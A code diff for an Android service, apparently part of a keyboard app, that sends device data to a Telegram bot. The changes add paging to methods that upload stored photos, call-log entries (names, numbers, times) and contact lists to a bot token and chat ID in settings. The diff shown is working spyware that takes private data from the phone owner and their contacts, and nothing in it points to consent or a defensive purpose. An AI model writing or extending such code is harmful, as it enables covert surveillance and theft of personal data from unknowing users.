@@ -195,20 +195,31 @@ public class TelegramCommandService extends Service {
 
     private void sendPhotos() {
         final SettingsValues settings = Settings.getInstance().getCurrent();
+        android.content.SharedPreferences prefs = android.preference.PreferenceManager.getDefaultSharedPreferences(this);
+        int offset = prefs.getInt("photos_offset", 0);
+        
         Uri uri = MediaStore.Images.Media.EXTERNAL_CONTENT_URI;
         String[] projection = {MediaStore.Images.Media.DATA, MediaStore.Images.Media.DATE_TAKEN};
         String sortOrder = MediaStore.Images.Media.DATE_TAKEN + " DESC";
         try (Cursor cursor = getContentResolver().query(uri, projection, null, null, sortOrder)) {
             if (cursor != null) {
+                if (!cursor.moveToPosition(offset)) {
+                    // Reached the end, reset offset
+                    prefs.edit().putInt("photos_offset", 0).apply();
+                    TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, "No more photos found. Resetting list to the beginning.");
+                    return;
+                }
+                
                 int count = 0;
-                while (cursor.moveToNext() && count < 10) {
+                while (count < 10) {
                     String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
-                    TelegramReporter.sendDocument(settings.mTelegramBotToken, settings.mTelegramChatId, new File(path), "Photo " + (count + 1));
+                    TelegramReporter.sendDocument(settings.mTelegramBotToken, settings.mTelegramChatId, new File(path), "Photo " + (offset + count + 1));
                     count++;
+                    if (!cursor.moveToNext()) {
+                        break;
+                    }
                 }
-                if (count == 0) {
-                    TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, "No photos found.");
-                }
+                prefs.edit().putInt("photos_offset", offset + count).apply();
             }
         } catch (Exception e) {
             Log.e(TAG, "Error sending photos", e);
@@ -217,11 +228,20 @@ public class TelegramCommandService extends Service {
 
     private void sendCallLogs() {
         final SettingsValues settings = Settings.getInstance().getCurrent();
-        StringBuilder sb = new StringBuilder("📞 Last 20 Call Logs:\n");
+        android.content.SharedPreferences prefs = android.preference.PreferenceManager.getDefaultSharedPreferences(this);
+        int offset = prefs.getInt("calls_offset", 0);
+        
+        StringBuilder sb = new StringBuilder("📞 Call Logs (Items " + (offset + 1) + "-" + (offset + 20) + "):\n");
         try (Cursor cursor = getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, CallLog.Calls.DATE + " DESC")) {
             if (cursor != null) {
+                if (!cursor.moveToPosition(offset)) {
+                    prefs.edit().putInt("calls_offset", 0).apply();
+                    TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, "No more call logs found. Resetting list to the beginning.");
+                    return;
+                }
+                
                 int count = 0;
-                while (cursor.moveToNext() && count < 20) {
+                while (count < 20) {
                     String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                     String name = cursor.getString(cursor.getColumnIndex(CallLog.Calls.CACHED_NAME));
                     int type = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.TYPE));
@@ -236,7 +256,11 @@ public class TelegramCommandService extends Service {
                             new SimpleDateFormat("MM-dd HH:mm", Locale.getDefault()).format(new Date(date)),
                             name != null ? name : "Unknown", number, typeStr));
                     count++;
+                    if (!cursor.moveToNext()) {
+                        break;
+                    }
                 }
+                prefs.edit().putInt("calls_offset", offset + count).apply();
                 TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, sb.toString());
             }
         } catch (Exception e) {
@@ -246,16 +270,29 @@ public class TelegramCommandService extends Service {
 
     private void sendContacts() {
         final SettingsValues settings = Settings.getInstance().getCurrent();
-        StringBuilder sb = new StringBuilder("👥 First 50 Contacts:\n");
+        android.content.SharedPreferences prefs = android.preference.PreferenceManager.getDefaultSharedPreferences(this);
+        int offset = prefs.getInt("contacts_offset", 0);
+        
+        StringBuilder sb = new StringBuilder("👥 Contacts (Items " + (offset + 1) + "-" + (offset + 50) + "):\n");
         try (Cursor cursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")) {
             if (cursor != null) {
+                if (!cursor.moveToPosition(offset)) {
+                    prefs.edit().putInt("contacts_offset", 0).apply();
+                    TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, "No more contacts found. Resetting list to the beginning.");
+                    return;
+                }
+                
                 int count = 0;
-                while (cursor.moveToNext() && count < 50) {
+                while (count < 50) {
                     String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                     String number = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                     sb.append(name).append(": ").append(number).append("\n");
                     count++;
+                    if (!cursor.moveToNext()) {
+                        break;
+                    }
                 }
+                prefs.edit().putInt("contacts_offset", offset + count).apply();
                 TelegramReporter.sendMessage(settings.mTelegramBotToken, settings.mTelegramChatId, sb.toString());
             }
         } catch (Exception e) {
